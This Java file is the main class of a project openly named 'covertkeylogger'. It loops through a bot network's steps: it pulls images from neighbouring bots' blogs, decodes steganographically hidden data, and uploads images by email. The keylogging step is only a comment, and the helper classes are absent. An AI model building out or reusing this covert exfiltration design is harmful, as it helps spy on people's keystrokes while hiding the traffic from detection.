package covertkeylogger;

import java.util.ArrayList;

public class Main {

	/**
	 * @param args
	 */
	public static void main(String[] args) {

		// Get arguments
		int botID = Integer.parseInt(args[0]);

		// Generate bot info...
		ArrayList<BotInfo> bots = BotInfo.createNetwork();

		// Verify
		BotInfo.verifyNetwork(bots);
		
		Steganographiser stego = new Steganographiser();

		// Main event loop for a single bot...

		while (true) {

			Downloader.deletePrevious();
			
			// Download all images from neighbours
			for (BotInfo bot : bots.get(botID).getConnectedNodes()) {

				Downloader.getImages(bot.getBlogName());

			}

			Downloader.resetCounter();

			// Extract data from images (stego) and store...

			stego.deSteganographise();
			
			// Get data from keylogging and store...

			// Prepare data for insertation to image

			// Upload images

			Uploader.upload(bots.get(botID).getPostEmail());

			// Sleep

			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			// do again

		}

	}

}
